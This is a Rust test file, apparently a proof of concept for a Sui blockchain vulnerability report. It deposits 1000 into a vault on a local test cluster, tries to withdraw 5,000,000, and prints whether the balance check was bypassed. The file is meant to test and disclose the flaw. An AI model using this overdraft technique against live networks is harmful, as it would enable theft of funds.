// Copyright (c) Mysten Labs, Inc.
// SPDX-License-Identifier: Apache-2.0

//! PoC: Object Withdrawal Amount Bypass — FINAL v6 (NO HELPER)
//!
//! FIX: Uses 5 separate gas objects (gas[0] through gas[4]),
//! each for a different tx. No version conflicts.

use sui_test_transaction_builder::FundSource;
use sui_types::effects::TransactionEffectsAPI;
use sui_types::base_types::SuiAddress;
use test_cluster::addr_balance_test_env::TestEnvBuilder;

#[tokio::test]
async fn test_no_balance_check_on_object_withdrawal() {
    println!("\n========================================");
    println!("  PoC: Object Withdrawal Amount Bypass");
    println!("  Deposit: 1000  |  Withdraw: 5,000,000");
    println!("========================================\n");

    // [1] Setup
    let mut env = TestEnvBuilder::new()
        .with_num_validators(1)
        .with_proto_override_cb(Box::new(|_, mut cfg| {
            cfg.set_enable_object_funds_withdraw_for_testing(true);
            cfg.enable_address_balance_gas_payments_for_testing();
            cfg
        }))
        .build()
        .await;

    let sender = env.get_sender(0);
    println!("[+] Test cluster started\n");

    // [2] Publish — use gas[0] (fresh, never used)
    println!("[1] Publishing object_balance package...");
    let gas0 = env.gas_objects[&sender][0];
    let tx = env
        .tx_builder_with_gas(sender, gas0)
        .publish_examples("object_balance")
        .await
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    let package_id = effects
        .created()
        .into_iter()
        .find(|(_, owner)| owner.is_immutable())
        .unwrap()
        .0
        .0;
    println!("    Package: {}\n", package_id);

    // [3] Create vault — use gas[1] (fresh, never used)
    println!("[2] Creating vault...");
    let gas1 = env.gas_objects[&sender][1];
    let tx = env
        .tx_builder_with_gas(sender, gas1)
        .move_call(package_id, "object_balance", "new_owned", vec![])
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    let vault_id = effects.created().into_iter().next().unwrap().0 .0;
    println!("    Vault: {}\n", vault_id);

    // [4] Deposit 1000 — use gas[2] for tx, gas[3] for fund source
    println!("[3] Depositing 1000 into vault...");
    let gas2 = env.gas_objects[&sender][2];
    let deposit_gas = env.gas_objects[&sender][3];

    let vault_addr: SuiAddress = vault_id.into();

    let tx = env
        .tx_builder_with_gas(sender, gas2)
        .transfer_sui_to_address_balance(
            FundSource::coin(deposit_gas),
            vec![(1000u64, vault_addr)],
        )
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    assert!(effects.status().is_ok());
    println!("    Deposited 1000 ✓\n");

    // [5] ATTACK — use gas[4] (fresh, never used before)
    let attack_amount = 5_000_000u64;
    let gas_attack = env.gas_objects[&sender][4];
    let vault_ref = env.cluster.get_latest_object_ref(&vault_id).await;

    println!("[4] ATTACK: Withdrawing {} from vault (balance: 1000)...", attack_amount);

    let tx = env
        .tx_builder_with_gas(sender, gas_attack)
        .transfer_sui_to_address_balance(
            FundSource::object_fund_owned(package_id, vault_ref),
            vec![(attack_amount, sender)],
        )
        .build();

    let result = env.exec_tx_directly(tx).await;

    // [6] Analyze
    println!("\n========================================");
    println!("  RESULT");
    println!("========================================\n");

    match result {
        Ok((digest, effects)) => {
            println!("    TX Digest: {}", digest);
            println!("    TX Status: {:?}\n", effects.status());

            if effects.status().is_ok() {
                println!("╔══════════════════════════════════════════════════════════════════╗");
                println!("║  🔴 CRITICAL: VULNERABILITY CONFIRMED!                          ║");
                println!("╚══════════════════════════════════════════════════════════════════╝");
                println!();
                println!("    withdraw_funds_from_object() SUCCEEDED");
                println!("    with amount 5000x the actual balance!");
                println!();
                println!("    Balance:    1,000");
                println!("    Requested:  5,000,000");
                println!("    Ratio:      5000x overdraft");
                println!();
                println!("    PROOF: No balance check in any layer before settlement.");
                println!();

                if !effects.accumulator_events().is_empty() {
                    println!("    [+] Split event found in effects!");
                }
                panic!("[CRITICAL] Balance check bypassed!");
            } else {
                let s = format!("{:?}", effects.status());
                println!("    ✓ Transaction FAILED\n");
                println!("    Status: {}\n", s);

                if s.contains("InsufficientFunds") || s.contains("ENotEnough") {
                    println!("╔══════════════════════════════════════════════════════════════════╗");
                    println!("║  🟢 DEFENSE DETECTED — VULNERABILITY LIKELY FIXED               ║");
                    println!("╚══════════════════════════════════════════════════════════════════╝");
                } else {
                    println!("[?] Unexpected error");
                }
            }
        }
        Err(e) => {
            println!("    ✗ Execution error: {:?}", e);
            println!("\n    [?] Test setup issue");
        }
    }
}
